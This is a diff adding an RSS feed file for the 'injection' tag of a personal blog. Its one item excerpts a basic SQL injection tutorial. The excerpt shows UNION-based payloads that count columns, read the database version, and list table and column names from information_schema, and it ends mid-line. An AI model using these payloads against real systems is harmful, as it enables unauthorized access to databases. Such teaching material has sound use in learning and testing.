@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Injection on warrick.io</title>
+    <link>//warrick.io/tags/injection/</link>
+    <description>Recent content in Injection on warrick.io</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Thu, 04 Oct 2012 17:18:44 +0000</lastBuildDate>
+    
+	<atom:link href="//warrick.io/tags/injection/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>basic sql injection</title>
+      <link>//warrick.io/posts/basic-sql-injection/</link>
+      <pubDate>Thu, 04 Oct 2012 17:18:44 +0000</pubDate>
+      
+      <guid>//warrick.io/posts/basic-sql-injection/</guid>
+      <description>SELECT user FROM users WHERE user.name = &amp;#39;jeffrey&amp;#39;;  FIND NUMBER OF COLUMNS
+&amp;ldquo;order by&amp;rdquo; trick - test if you can order by a column number
+ NOW WE CAN DO A UNION (# OF COLUMNS MUST MATCH)
+&amp;rsquo; union select 1,2,3,version() &amp;ndash; -
+ NOW WE CAN GET TABLE, COLUMN, AND DATABASE INFO
+&amp;rsquo; union select 1,2,3,table_name from information_schema.tables where table_schema=&amp;ldquo;x8250&amp;rdquo; &amp;ndash; -
+&amp;rsquo; union select 1,2,3,column_name from information_schema.columns where table&amp;hellip;</description>
+    </item>
+    
+  </channel>
+</rss>
